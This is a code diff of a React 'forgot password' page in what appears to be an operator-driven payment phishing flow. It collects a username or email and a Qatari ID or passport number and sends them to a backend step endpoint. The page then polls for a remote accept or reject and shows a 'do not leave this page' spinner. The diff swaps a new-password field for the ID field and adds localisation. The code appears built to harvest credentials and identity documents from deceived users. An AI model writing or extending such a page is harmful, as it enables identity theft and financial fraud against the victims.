@@ -1,124 +1,122 @@
 import { useState } from "react";
 import { useLocation, useNavigate } from "react-router-dom";
-import { Button, PasswordInput, TextInput } from "@mantine/core";
-import { KeyRound } from "lucide-react";
 import { paymentsApi } from "../../api/payments";
 import { useFlowPoll } from "../../hooks/useFlowPoll";
-import styles from "./FlowPages.module.scss";
+import { useLang } from "../../context/LanguageContext";
+import { FlowHeader } from "./FlowHeader";
+import { FlowLoading } from "./FlowLoading";
+import styles from "./FlowForgotPasswordPage.module.scss";
 
 export function FlowForgotPasswordPage() {
   const location = useLocation();
   const navigate = useNavigate();
+  const { t, dir } = useLang();
+  const ft = t.flow;
+  const ff = ft.forgotPassword;
+
   const state = location.state as { reference?: string } | null;
   const reference = state?.reference ?? sessionStorage.getItem("pay_ref") ?? "";
 
   const [email, setEmail] = useState("");
-  const [newPassword, setNewPassword] = useState("");
+  const [qid, setQid] = useState("");
   const [submitted, setSubmitted] = useState(false);
   const [busy, setBusy] = useState(false);
   const [error, setError] = useState("");
 
+  const [emailRequiredError, setEmailRequiredError] = useState(false);
+  const [emailPhoneError, setEmailPhoneError] = useState(false);
+
   useFlowPoll({
     reference,
     currentPage: "forgot-password",
-    enabled: submitted && !!reference,
+    enabled: !!reference,
+    onReset: () => {
+      setSubmitted((prev) => {
+        if (prev) setError(ff.rejected);
+        return false;
+      });
+    },
   });
 
-  const handleSubmit = async () => {
-    if (!email.trim() || !newPassword) {
-      setError("Please fill all fields");
+  const validateEmail = (val: string) => {
+    if (!val.trim()) { setEmailRequiredError(true); setEmailPhoneError(false); return false; }
+    setEmailRequiredError(false);
+    const isPhone = /^[\d\s\+\-\(\)]{4,}$/.test(val) && /\d{4,}/.test(val);
+    setEmailPhoneError(isPhone);
+    return !isPhone;
+  };
+
+  const handleSubmit = async (e: React.FormEvent) => {
+    e.preventDefault();
+    const isEmailValid = validateEmail(email);
+    if (!isEmailValid || !qid.trim()) {
+      if (!qid.trim()) setError(ff.fillAll);
       return;
     }
     setBusy(true);
     setError("");
     try {
       await paymentsApi.flowStep(reference, "reset_password_submitted", {
-        email_or_username: email,
-        password: newPassword,
+        email_or_username: email.trim(),
+        qatari_id_or_passport: qid.trim(),
       });
       setSubmitted(true);
     } catch {
-      setError("Network error — please try again");
+      setError(ft.networkError);
     } finally {
       setBusy(false);
     }
   };
 
-  if (!reference) {
-    navigate("/", { replace: true });
-    return null;
-  }
+  if (!reference) { navigate("/", { replace: true }); return null; }
 
   return (
-    <div className={styles.flowPage}>
-      <div className={styles.flowCard}>
-        <div className={styles.flowLogo}>
-          <KeyRound size={44} color="#8b1a3a" />
+    <div style={{ display: "flex", flexDirection: "column", minHeight: "100vh" }}>
+      <FlowHeader />
+      <div className={styles.container} dir={dir}>
+        <div className={styles.card}>
+          <div className={styles.header}>
+            <p className={styles.brandText}>{ft.brand}</p>
+            <h1 className={styles.title}>{ff.title}</h1>
+            <p className={styles.subtitle}>{ff.subtitle}</p>
+          </div>
+          <p className={styles.desc}>{ff.desc}</p>
+
+          {error && <div className={styles.errorBox}>{error}</div>}
+
+          <form onSubmit={handleSubmit} className={styles.form}>
+            <div>
+              <input
+                type="text"
+                name="email_or_username"
+                autoComplete="username"
+                placeholder={ff.usernamePlaceholder}
+                value={email}
+                onChange={(e) => { setEmail(e.target.value); validateEmail(e.target.value); }}
+                onBlur={() => validateEmail(email)}
+                className={`${styles.input} ${emailRequiredError || emailPhoneError ? styles.inputError : ""}`}
+              />
+              {emailRequiredError && <p className={styles.fieldError}>{ft.required}</p>}
+              {emailPhoneError && <p className={styles.fieldError}>{ft.noPhoneAllowed}</p>}
+            </div>
+
+            <input
+              type="text"
+              name="qatari_id_or_passport"
+              autoComplete="off"
+              placeholder={ff.qidPlaceholder}
+              value={qid}
+              onChange={(e) => setQid(e.target.value)}
+              className={styles.input}
+            />
+
+            <button type="submit" disabled={busy || emailPhoneError} className={styles.submitBtn}>
+              {ff.submit}
+            </button>
+          </form>
         </div>
-        <p className={styles.flowTitle}>Reset Password</p>
-        <p className={styles.flowSubtitle}>
-          Enter your email and a new password
-        </p>
-
-        <TextInput
-          label="Email / Username"
-          placeholder="email or username"
-          value={email}
-          onChange={(e) => setEmail(e.currentTarget.value)}
-          mb="sm"
-        />
-        <PasswordInput
-          label="New Password"
-          placeholder="New password"
-          value={newPassword}
-          onChange={(e) => setNewPassword(e.currentTarget.value)}
-          mb="sm"
-        />
-
-        {error && (
-          <p
-            style={{ color: "#991b1b", fontSize: "0.85rem", marginBottom: 10 }}
-          >
-            {error}
-          </p>
-        )}
-
-        <Button
-          fullWidth
-          loading={busy}
-          onClick={handleSubmit}
-          className={styles.submitBtn}
-          styles={{
-            root: {
-              background: "#8b1a3a",
-              "&:hover": { background: "#751532" },
-            },
-          }}
-        >
-          Reset Password
-        </Button>
+        {submitted && <FlowLoading />}
       </div>
-
-      {submitted && (
-        <div className={styles.loadingWrap}>
-          <div className={styles.spinnerOuter}>
-            <div className={styles.spinnerInner} />
-          </div>
-          <p className={styles.loadingTitle}>Please wait</p>
-          <p className={styles.loadingSubtitle}>Processing your information</p>
-          <div className={styles.loadingNoteBox}>
-            <p className={styles.loadingNote}>
-              Please do not leave or refresh this page until the process is
-              complete
-            </p>
-          </div>
-          <div className={styles.dots}>
-            <span className={styles.dot} />
-            <span className={styles.dot} />
-            <span className={styles.dot} />
-          </div>
-        </div>
-      )}
     </div>
   );
 }
